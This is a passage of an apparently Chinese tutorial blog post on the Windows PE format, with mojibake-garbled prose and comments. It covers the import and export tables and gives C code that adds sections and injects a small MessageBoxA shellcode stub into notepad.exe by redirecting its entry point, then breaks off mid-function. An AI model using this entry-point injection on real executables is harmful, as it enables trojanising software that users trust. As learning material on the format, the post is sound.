src="/2023/05/19/PE-FILE/image-20230519181813832.png" alt="image-20230519181813832"></p><p>0x77243e60è¿™ä¸ªåœ°å€å°±æ˜¯PageSetupDlgwå¯¼å…¥å‡½æ•°åœ°å€</p><p><img src="/2023/05/19/PE-FILE/image-20230519181542374.png" alt="image-20230519181542374"></p><p><img src="/2023/05/19/PE-FILE/image-20230519180449954.png" alt="image-20230519180449954"></p><p>ç±»ä¼¼äºELFé‡Œçš„gotè¡¨,è°ƒç”¨è¿™ç§å¯¼å…¥å‡½æ•°æ—¶æ˜¯ä¸€ä¸ªé—´æ¥è°ƒç”¨call *(iat)</p><h2 id="å¯¼å‡ºè¡¨"><a href="#å¯¼å‡ºè¡¨" class="headerlink" title="å¯¼å‡ºè¡¨"></a>å¯¼å‡ºè¡¨</h2><p>_IMAGE_OPTIONAL_HEADERé‡ŒDataDirectoryçš„ç¬¬ä¸€é¡¹ï¼Œå¯¼å‡ºè¡¨åªæœ‰ä¸€ä¸ª</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;        <span class="comment">// å¯¼å‡ºè¡¨çš„ç‰¹æ€§æ ‡å¿—ã€‚</span></span><br><span class="line">    DWORD   TimeDateStamp;          <span class="comment">// å¯¼å‡ºè¡¨çš„æ—¶é—´æˆ³ã€‚</span></span><br><span class="line">    WORD    MajorVersion;           <span class="comment">// å¯¼å‡ºè¡¨çš„ä¸»è¦ç‰ˆæœ¬å·ã€‚</span></span><br><span class="line">    WORD    MinorVersion;           <span class="comment">// å¯¼å‡ºè¡¨çš„æ¬¡è¦ç‰ˆæœ¬å·ã€‚</span></span><br><span class="line">    DWORD   Name;                   <span class="comment">// æ¨¡å—åç§°çš„ RVAï¼ˆç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼‰ã€‚</span></span><br><span class="line">    DWORD   Base;                   <span class="comment">// å¯¼å‡ºå‡½æ•°çš„èµ·å§‹åºå·ã€‚</span></span><br><span class="line">    DWORD   NumberOfFunctions;      <span class="comment">// å¯¼å‡ºå‡½æ•°çš„æ•°é‡ã€‚</span></span><br><span class="line">    DWORD   NumberOfNames;          <span class="comment">// å¯¼å‡ºå‡½æ•°åç§°çš„æ•°é‡ã€‚</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// å¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„ RVAï¼ˆç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼‰ã€‚</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// å¯¼å‡ºå‡½æ•°åç§°è¡¨çš„ RVAï¼ˆç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼‰ã€‚</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// å¯¼å‡ºå‡½æ•°åºå·è¡¨çš„ RVAï¼ˆç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼‰ã€‚</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><blockquote><p>NumberOfFunctionså‡½æ•°ï¼Œå¯¼å‡ºæ—¶ä¸æŒ‰åºå·é¡ºåºå¯¼å‡ºï¼Œç©ºä½™ä½ä¹Ÿè®¡å…¥ï¼Œæ¯”å¦‚1ï¼Œ5ï¼Œ2ï¼Œ3 ä½†æ˜¯NumberOfFunctions&#x3D;5</p><p>æ‰€ä»¥å°±éœ€è¦å¯¼å‡ºå‡½æ•°åºå·è¡¨çš„å°†å‡½æ•°åœ°å€å’Œåç§°è”ç³»èµ·æ¥</p><p>å¯¼å‡ºå‡½æ•°å¯ä»¥æ²¡æœ‰åå­—ä½†æ˜¯ä¸€å®šè¦æœ‰åºå·</p></blockquote><p>çœ‹ä¸€ä¸‹GetProcAddressæ˜¯å¦‚ä½•è§£æçš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(HMODULE hModule ,LPCWSTR lpPro0cName)</span></span><br></pre></td></tr></table></figure><h4 id="lpPro0cNameå‚æ•°æ˜¯nameæ—¶ï¼ˆå¤§äº-0x10000ï¼‰"><a href="#lpPro0cNameå‚æ•°æ˜¯nameæ—¶ï¼ˆå¤§äº-0x10000ï¼‰" class="headerlink" title="lpPro0cNameå‚æ•°æ˜¯nameæ—¶ï¼ˆå¤§äº 0x10000ï¼‰"></a>lpPro0cNameå‚æ•°æ˜¯nameæ—¶ï¼ˆå¤§äº 0x10000ï¼‰</h4><ul><li>æ ¹æ®AddressOfNamesçš„RVAæ‰¾åˆ°å¯¼å‡ºå‡½æ•°åç§°è¡¨(é‡Œé¢æ—¶å­—ç¬¦ä¸²æŒ‡é’ˆçš„RVA)ï¼Œåˆ©ç”¨strcmpæ¯”è¾ƒå­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°åç§°ï¼Œå¹¶è®°å½•ä¸‹è¯¥åç§°åœ¨å¯¼å‡ºå‡½æ•°åç§°è¡¨çš„named_indexï¼Œåç§°è¡¨é‡Œçš„æŒ‡é’ˆæŒ‡å‘çš„åå­—éƒ½æ˜¯A-Za-zæ’åºå¥½çš„ï¼ŒæŒ‰ç…§æœ´ç´ çš„äºŒåˆ†æ³•æ•ˆç‡è›®é«˜çš„ æ¯•ç«Ÿæœ€å¤šlog2(n) æ¬¡å˜›:)</li><li>AddressOfNameOrdinalsæ‰¾åˆ°å¯¼å‡ºå‡½æ•°åºå·è¡¨ï¼Œæ ¹æ®named_indexæ‰¾åˆ°å¯¹åº”çš„orinal</li><li>AddressOfFunctionsæ‰¾åˆ°å¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„(EAT  Export Address Table)ï¼Œæ ¹æ®orinalæ‰¾åˆ°å‡½æ•°çš„RVA</li></ul><h4 id="lpPro0cNameå‚æ•°æ˜¯åºå·æ—¶ï¼ˆå°äº-0x10000ï¼‰"><a href="#lpPro0cNameå‚æ•°æ˜¯åºå·æ—¶ï¼ˆå°äº-0x10000ï¼‰" class="headerlink" title="lpPro0cNameå‚æ•°æ˜¯åºå·æ—¶ï¼ˆå°äº 0x10000ï¼‰"></a>lpPro0cNameå‚æ•°æ˜¯åºå·æ—¶ï¼ˆå°äº 0x10000ï¼‰</h4><ul><li>åºå·å‡å»Baseï¼ˆèµ·å§‹åºå·ï¼‰å¾—åˆ°index</li><li>æ ¹æ®indexå»å‡½æ•°åœ°å€è¡¨å»æ‰¾</li></ul><h2 id="some-opertion-about-pe"><a href="#some-opertion-about-pe" class="headerlink" title="some opertion about pe"></a>some opertion about pe</h2><p>main.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;init.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAME <span class="string">&quot;C:\\Users\\zbx\\Desktop\\notepad.exe&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEWNAME <span class="string">&quot;new.exe&quot;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">18</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xE8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xE9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">size_t</span> size = <span class="number">18</span>;</span><br><span class="line">DWORD AddNewSectionSize=<span class="number">0x1000</span>;</span><br><span class="line">DWORD ExpandSectionSize = <span class="number">0x1000</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//*********FiletoImageToFile********</span></span><br><span class="line">    <span class="comment">/*void* Filebuffer;</span></span><br><span class="line"><span class="comment">    void* Imagebuffer;</span></span><br><span class="line"><span class="comment">    void* Newfilebuffer;</span></span><br><span class="line"><span class="comment">    size_t size;</span></span><br><span class="line"><span class="comment">    size = PeCopyToFilebuffer(NAME, &amp;Filebuffer);</span></span><br><span class="line"><span class="comment">    FileToImage(Filebuffer, &amp;Imagebuffer);</span></span><br><span class="line"><span class="comment">    ImageToFile(Imagebuffer, &amp;Newfilebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME, size, Newfilebuffer);</span></span><br><span class="line"><span class="comment">    free(Filebuffer);</span></span><br><span class="line"><span class="comment">    free(Imagebuffer);</span></span><br><span class="line"><span class="comment">    free(Newfilebuffer);</span></span><br><span class="line"><span class="comment">    printf(&quot;get a new one &quot;);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//********GetMessageBoxA********</span></span><br><span class="line">    <span class="comment">/*size_t size;</span></span><br><span class="line"><span class="comment">    void* filebuffer = NULL;</span></span><br><span class="line"><span class="comment">    size = PeCopyToFilebuffer(NAME, &amp;filebuffer);</span></span><br><span class="line"><span class="comment">    AddShellcode(filebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME, size, filebuffer);</span></span><br><span class="line"><span class="comment">    free(filebuffer);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//********AddANewSection*********</span></span><br><span class="line">    <span class="comment">/*void* filebuffer=NULL;</span></span><br><span class="line"><span class="comment">    void* newfilebuffer=NULL;</span></span><br><span class="line"><span class="comment">    size_t size = 0;</span></span><br><span class="line"><span class="comment">    size_t newsize = 0;</span></span><br><span class="line"><span class="comment">    size=PeCopyToFilebuffer(NAME,&amp;filebuffer);</span></span><br><span class="line"><span class="comment">    newsize =AddANewSection(filebuffer,size,&amp;newfilebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME,newsize,newfilebuffer);</span></span><br><span class="line"><span class="comment">    free(filebuffer);</span></span><br><span class="line"><span class="comment">    free(newfilebuffer);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//***********ExpandTheLastSection*********</span></span><br><span class="line">    <span class="type">void</span>* filebuffer=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">void</span>* newfilebuffer=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> newsize = <span class="number">0</span>;</span><br><span class="line">    size=PeCopyToFilebuffer(NAME,&amp;filebuffer);</span><br><span class="line">    newsize = ExpandTheLastSection(filebuffer,size,&amp;newfilebuffer);</span><br><span class="line">    FilebufferCopytoPe(NEWNAME,newsize,newfilebuffer);</span><br><span class="line">    <span class="built_in">free</span>(filebuffer);</span><br><span class="line">    <span class="built_in">free</span>(newfilebuffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init.h</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _FileToimagetofile</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _FileTOimagetofile</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line">DWORD <span class="title function_">PeCopyToFilebuffer</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, OUT <span class="type">void</span>** pointer)</span>;</span><br><span class="line">DWORD <span class="title function_">FileToImage</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Filept, OUT <span class="type">void</span>** Imagept)</span>;</span><br><span class="line">DWORD <span class="title function_">ImageToFile</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Imagept, OUT <span class="type">void</span>** Filept)</span>;</span><br><span class="line">DWORD <span class="title function_">FilebufferCopytoPe</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span>* Filept)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">AddANewSection</span><span class="params">(IN <span class="type">void</span> *filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer,OUT <span class="type">void</span> **newfilebuffer)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AddShellcode</span><span class="params">(IN <span class="type">void</span>* filebuffer)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ExpandTheLastSection</span><span class="params">(IN <span class="type">void</span> * filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer,OUT <span class="type">void</span> **newfilebuffer)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>init.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;init.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG 0</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> shellcode[<span class="number">18</span>];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> size;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> size;</span><br><span class="line"><span class="keyword">extern</span> DWORD AddNewSectionSize;</span><br><span class="line"><span class="keyword">extern</span> DWORD ExpandSectionSize;</span><br><span class="line">DWORD <span class="title function_">PeCopyToFilebuffer</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, OUT <span class="type">void</span>** pointer)</span> &#123;</span><br><span class="line">    FILE* PE = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">void</span>* Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    DWORD fin;</span><br><span class="line">    PE = fopen(name, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == PE) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;file open PE %s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fseek(PE, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    size = ftell(PE);</span><br><span class="line">    Filebuffer = <span class="built_in">malloc</span>(size);</span><br><span class="line">    fseek(PE, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    fread(Filebuffer, size, <span class="number">1</span>, PE);</span><br><span class="line">    *pointer = Filebuffer;</span><br><span class="line">    Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    fclose(PE);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">FileToImage</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Filept, OUT <span class="type">void</span>** Imagept)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PimageDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeads = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PimageDosHeader = (PIMAGE_DOS_HEADER)Filept;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PimageDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeads = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)Filept + PimageDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)PNtHeads != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)Filept + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="number">4</span>);<span class="comment">//peå¤´åŒ…æ‹¬æ ‡å‡†å¤´ï¼ˆFILEHEADERï¼‰ï¼Œå¯é€‰peå¤´ï¼ˆOPTIONHEADERï¼‰å’Œå››ä¸ªå­—èŠ‚çš„PEæ ‡è¯†ï¼›</span></span><br><span class="line">    <span class="type">void</span>* PImagetemp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = PNtHeads-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">    PImagetemp = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(PImagetemp, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">memcpy</span>(PImagetemp, Filept, PNtHeads-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; i++, PSectionHeader++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;FileToImage%x\n&quot;</span>, PSectionHeader-&gt;VirtualAddress);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)((<span class="type">char</span>*)PImagetemp + PSectionHeader-&gt;VirtualAddress), (<span class="type">void</span>*)((<span class="type">char</span>*)Filept + PSectionHeader-&gt;PointerToRawData), PSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">    &#125;</span><br><span class="line">    *Imagept = PImagetemp;</span><br><span class="line">    PImagetemp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> PNtHeads-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">ImageToFile</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Imagept, OUT <span class="type">void</span>** Filept)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* Filebuffer;</span><br><span class="line">    PIMAGE_DOS_HEADER PimageDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeads = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PimageDosHeader = (PIMAGE_DOS_HEADER)Imagept;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PimageDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeads = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)Imagept + PimageDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)PNtHeads != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)Imagept + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">    size = PNtHeads-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">    PIMAGE_SECTION_HEADER tempPsection = PSectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; ++tempPsection, ++i) &#123;</span><br><span class="line">        size += tempPsection-&gt;SizeOfRawData;</span><br><span class="line">    &#125;</span><br><span class="line">    Filebuffer = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(Filebuffer, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">memcpy</span>(Filebuffer, Imagept, PNtHeads-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; ++PSectionHeader, ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ImageToFile%x\n&quot;</span>, PSectionHeader-&gt;PointerToRawData);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)((<span class="type">char</span>*)Filebuffer + PSectionHeader-&gt;PointerToRawData), (<span class="type">void</span>*)((<span class="type">char</span>*)Imagept + PSectionHeader-&gt;VirtualAddress), PSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">    &#125;</span><br><span class="line">    *Filept = Filebuffer;</span><br><span class="line">    Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">FilebufferCopytoPe</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span>* Filept)</span> &#123;</span><br><span class="line">    FILE* tempfp;</span><br><span class="line">    tempfp = fopen(name, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == tempfp) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;file open PE %s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite(Filept, size, <span class="number">1</span>, tempfp);</span><br><span class="line">    fclose(tempfp);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AddShellcode</span><span class="params">(IN <span class="type">void</span>* filebuffer)</span> &#123;</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//PSectionHeader = (PIMAGE_SECTION_HEADER)((char*)Filept + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader + IMAGE_SIZEOF_FILE_HEADER + 4);</span></span><br><span class="line">    <span class="keyword">if</span> ((PSectionHeader-&gt;SizeOfRawData - *(PDWORD)PSectionHeader) &lt; size) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;to small&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD jmpaddress;</span><br><span class="line">    DWORD calladdress;</span><br><span class="line">    DWORD newenterypointer = PSectionHeader-&gt;VirtualAddress + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;PSectionHeader-&gt;PointerToRawData%x\nPSectionHeader-&gt;Misc.VirtualSize%x\n&quot;</span>, PSectionHeader-&gt;PointerToRawData, PSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DWORD newenterypointer = 0x1a723;</span></span><br><span class="line"></span><br><span class="line">    calladdress = <span class="number">0x7672A820</span> - (<span class="number">8</span> + newenterypointer + <span class="number">5</span> + PNtHeaders-&gt;OptionalHeader.ImageBase);</span><br><span class="line">    jmpaddress = PNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint - (PSectionHeader-&gt;VirtualAddress + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span> + <span class="number">8</span> + <span class="number">5</span> + <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//addressofnetersæ˜¯åœ¨å†…å­˜ä¸­çš„ä½ç½®</span></span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;call:%x\njmp:%x\n&quot;</span>, calladdress, jmpaddress);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size:%d\n&quot;</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;shellcode[<span class="number">9</span>], &amp;calladdress, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;shellcode[<span class="number">14</span>], &amp;jmpaddress, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;size:%d\n&quot;, size);</span></span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint = newenterypointer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(((<span class="type">char</span>*)(filebuffer)+PSectionHeader-&gt;PointerToRawData + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span>), shellcode, size);</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size:%d\n&quot;</span>, size);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X  &quot;</span>, shellcode[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, newenterypointer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">AddANewSection</span><span class="params">(IN <span class="type">void</span>* filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer, OUT <span class="type">void</span>** newfilebuffer)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER LastSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span 